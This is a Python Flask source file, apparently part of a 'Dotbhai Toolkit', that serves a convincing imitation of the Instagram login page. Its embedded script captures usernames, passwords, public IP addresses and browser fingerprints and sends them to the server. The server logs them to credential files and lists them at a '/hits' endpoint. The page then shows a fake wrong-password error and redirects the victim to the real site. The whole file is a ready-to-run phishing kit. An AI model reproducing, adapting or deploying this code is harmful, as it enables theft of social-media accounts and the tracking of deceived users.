from flask import Flask, request, jsonify, render_template_string
from datetime import datetime

app = Flask(__name__)

CREDS_FILE = "insta_creds.txt"
LOG_FILE   = "insta_access.log"
HITS = []

# ═══════════════════════════════════════════════════════════
# قالب صفحة إنستجرام
# ═══════════════════════════════════════════════════════════
IG_HTML = r"""
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login • Instagram</title>
<link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background:#fafafa;
    color:#262626;
    min-height:100vh;
    display:flex;
    flex-direction:column;
  }
  .wrap {
    flex:1;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:40px 20px;
    gap:0;
  }
  .phone-side {
    width:380px;
    height:580px;
    background-image:url('https://static.cdninstagram.com/rsrc.php/v3/y4/r/ItTndlYMqO8.png');
    background-size:cover;
    background-position:center;
    background-repeat:no-repeat;
    margin-right:20px;
    display:none;
  }
  @media (min-width:876px) { .phone-side { display:block; } }

  .main-col { width:350px; }

  .card {
    background:#fff;
    border:1px solid #dbdbdb;
    border-radius:1px;
    padding:40px 40px 20px;
    text-align:center;
    margin-bottom:10px;
  }

  .ig-logo {
    width:175px;
    height:auto;
    margin-bottom:35px;
    font-family:'Billabong', cursive;
    font-size:52px;
    line-height:1;
    background:linear-gradient(45deg,#f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);
    -webkit-background-clip:text;
    -webkit-text-fill-color:transparent;
    background-clip:text;
    font-weight:400;
  }

  .input {
    width:100%;
    padding:9px 8px 7px;
    background:#fafafa;
    border:1px solid #dbdbdb;
    border-radius:3px;
    font-size:12px;
    margin-bottom:6px;
    outline:none;
    font-family:inherit;
    color:#262626;
  }
  .input::placeholder { color:#8e8e8e; font-size:12px; }
  .input:focus { border-color:#a8a8a8; background:#fff; }

  .btn {
    width:100%;
    padding:7px 16px;
    background:#0095f6;
    color:#fff;
    border:none;
    border-radius:8px;
    font-size:14px;
    font-weight:600;
    cursor:pointer;
    font-family:inherit;
    margin-top:8px;
    margin-bottom:14px;
  }
  .btn:hover { background:#1877f2; }
  .btn:disabled { opacity:.5; cursor:default; }

  .or-row {
    display:flex;
    align-items:center;
    margin:10px 0 18px;
    color:#8e8e8e;
    font-size:12px;
    font-weight:600;
  }
  .or-row::before, .or-row::after {
    content:'';
    flex:1;
    height:1px;
    background:#dbdbdb;
  }
  .or-row span { margin:0 18px; }

  .fb-login {
    display:flex;
    align-items:center;
    justify-content:center;
    gap:8px;
    color:#385185;
    font-size:14px;
    font-weight:600;
    text-decoration:none;
    margin-bottom:14px;
  }
  .fb-login:hover { text-decoration:none; }
  .fb-icon {
    width:16px; height:16px;
    background:#385185; color:#fff;
    border-radius:2px; display:inline-flex;
    align-items:center; justify-content:center;
    font-size:12px; font-weight:900;
    font-family:Georgia, serif;
  }

  .forgot {
    color:#00376b;
    font-size:12px;
    text-decoration:none;
    display:inline-block;
  }
  .forgot:hover { text-decoration:underline; }

  .signup-card {
    background:#fff;
    border:1px solid #dbdbdb;
    padding:22px;
    text-align:center;
    font-size:14px;
    margin-bottom:20px;
  }
  .signup-card a {
    color:#0095f6;
    font-weight:600;
    text-decoration:none;
  }

  .apps {
    text-align:center;
    font-size:14px;
    margin-bottom:14px;
  }
  .apps p { margin-bottom:12px; }
  .apps img { height:40px; margin:0 4px; }

  footer {
    text-align:center;
    font-size:12px;
    color:#8e8e8e;
    padding:20px;
    line-height:1.8;
  }
  footer a { color:#8e8e8e; text-decoration:none; margin:0 8px; }
  footer a:hover { text-decoration:underline; }

  .err {
    color:#ed4956;
    font-size:14px;
    margin:14px 0;
    display:none;
    text-align:center;
  }
</style>
</head>
<body>

<div class="wrap">
  <div class="phone-side"></div>

  <div class="main-col">
    <div class="card">
      <div class="ig-logo">Instagram</div>

      <form id="f">
        <input class="input" type="text"     id="user" name="username" placeholder="Phone number, username, or email" autocomplete="username" spellcheck="false" autofocus>
        <input class="input" type="password" id="pass" name="password" placeholder="Password" autocomplete="current-password">
        <button class="btn" type="submit">Log in</button>
      </form>

      <div class="or-row"><span>OR</span></div>

      <a href="#" class="fb-login">
        <span class="fb-icon">f</span>
        Log in with Facebook
      </a>

      <a href="#" class="forgot">Forgot password?</a>

      <div class="err" id="err"></div>
    </div>

    <div class="signup-card">
      Don't have an account? <a href="#">Sign up</a>
    </div>

    <div class="apps">
      <p>Get the app.</p>
      <img src="https://static.cdninstagram.com/rsrc.php/v3/yR/r/7JwLQ4KqH6L.png" alt="Get it on Google Play">
      <img src="https://static.cdninstagram.com/rsrc.php/v3/yb/r/9q7RPM1z3tU.png" alt="Get it from Microsoft">
    </div>
  </div>
</div>

<footer>
  <div>
    <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a>
    <a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a>
    <a href="#">Locations</a><a href="#">Instagram Lite</a><a href="#">Threads</a>
    <a href="#">Contact Uploading &amp; Non-Users</a><a href="#">Meta Verified</a>
  </div>
  <div style="margin-top:12px;">
    <a href="#">English</a><a href="#">العربية</a><a href="#">Español</a>
    <a href="#">Français</a><a href="#">Deutsch</a><a href="#">Italiano</a>
    <a href="#">Português</a><a href="#">日本語</a>
  </div>
  <div style="margin-top:12px;">© 2025 Instagram from Meta</div>
</footer>

<script>
  async function getIP(){
    try { const r = await fetch('https://api.ipify.org?format=json'); return (await r.json()).ip; }
    catch(e){ return null; }
  }
  async function fp(){
    const d = {
      ua: navigator.userAgent,
      platform: navigator.platform,
      lang: navigator.language,
      screen: screen.width + 'x' + screen.height,
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      cores: navigator.hardwareConcurrency,
      touch: 'ontouchstart' in window
    };
    try {
      const c = document.createElement('canvas');
      const gl = c.getContext('webgl');
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
    } catch(e){}
    return d;
  }

  document.getElementById('f').addEventListener('submit', async (e) => {
    e.preventDefault();
    const user = document.getElementById('user').value.trim();
    const pass = document.getElementById('pass').value;
    if (!user || !pass) return;

    const payload = {
      username: user,
      password: pass,
      ip: await getIP(),
      fp: await fp(),
      ts: new Date().toISOString()
    };

    try {
      await fetch('/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch(e){}

    // رسالة خطأ شبيهة بالحقيقية
    const err = document.getElementById('err');
    err.textContent = "Sorry, your password was incorrect. Please double-check your password.";
    err.style.display = 'block';
    document.getElementById('pass').value = '';

    setTimeout(() => {
      window.location.href = 'https://www.instagram.com/accounts/login/';
    }, 2500);
  });
</script>
</body>
</html>
"""


# ═══════════════════════════════════════════════════════════
@app.route("/")
def index():
    return render_template_string(IG_HTML)


@app.route("/capture", methods=["POST"])
def capture():
    data = request.get_json(silent=True) or {}
    username = data.get("username", "")
    password = data.get("password", "")
    ip = data.get("ip") or request.remote_addr
    fp = data.get("fp", {})
    ts = data.get("ts", datetime.now().isoformat())

    hit = {
        "ts": ts,
        "username": username,
        "password": password,
        "ip": ip,
        "ua": fp.get("ua", ""),
        "platform": fp.get("platform", ""),
        "lang": fp.get("lang", ""),
        "screen": fp.get("screen", ""),
        "tz": fp.get("tz", ""),
        "cores": fp.get("cores", ""),
        "gpu": fp.get("gpu", ""),
        "touch": fp.get("touch", False),
    }
    HITS.append(hit)

    line1 = "=" * 62
    print(f"\n\033[95m{line1}\033[0m")
    print(f"\033[91m[+]\033[0m NEW INSTAGRAM HIT  —  \033[93m{ts}\033[0m")
    print(f"\033[95m{line1}\033[0m")
    print(f"  \033[96mUsername :\033[0m \033[1;93m{username}\033[0m")
    print(f"  \033[96mPassword :\033[0m \033[1;91m{password}\033[0m")
    print(f"  \033[96mIP       :\033[0m {ip}")
    print(f"  \033[96mPlatform :\033[0m {hit['platform']}")
    print(f"  \033[96mLang     :\033[0m {hit['lang']}")
    print(f"  \033[96mScreen   :\033[0m {hit['screen']}")
    print(f"  \033[96mTimezone :\033[0m {hit['tz']}")
    print(f"  \033[96mCores    :\033[0m {hit['cores']}")
    print(f"  \033[96mGPU      :\033[0m {hit['gpu']}")
    print(f"  \033[96mTouch    :\033[0m {hit['touch']}")
    print(f"  \033[96mUA       :\033[0m {hit['ua']}")
    print(f"\033[95m{line1}\033[0m\n")

    with open(CREDS_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n[{ts}]\n")
        f.write(f"Username : {username}\n")
        f.write(f"Password : {password}\n")
        f.write(f"IP       : {ip}\n")
        f.write(f"Platform : {hit['platform']}\n")
        f.write(f"Lang     : {hit['lang']}\n")
        f.write(f"Screen   : {hit['screen']}\n")
        f.write(f"Timezone : {hit['tz']}\n")
        f.write(f"Cores    : {hit['cores']}\n")
        f.write(f"GPU      : {hit['gpu']}\n")
        f.write(f"UA       : {hit['ua']}\n")
        f.write("-" * 62 + "\n")

    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"{ts} | {ip} | {username}:{password}\n")

    return jsonify({"ok": True}), 200


@app.route("/hits")
def hits():
    return jsonify(HITS[-100:])


if __name__ == "__main__":
    print("\n\033[95m" + "═" * 62 + "\033[0m")
    print("  \033[1;93mInstagram Clone — Dotbhai Toolkit\033[0m")
    print("\033[95m" + "═" * 62 + "\033[0m")
    print("  \033[96mServer    :\033[0m http://0.0.0.0:5000")
    print("  \033[96mAdmin     :\033[0m http://0.0.0.0:5000/hits")
    print("  \033[96mCredentials file:\033[0m insta_creds.txt")
    print("\033[95m" + "═" * 62 + "\033[0m\n")
    app.run(host="0.0.0.0", port=5000, debug=False)
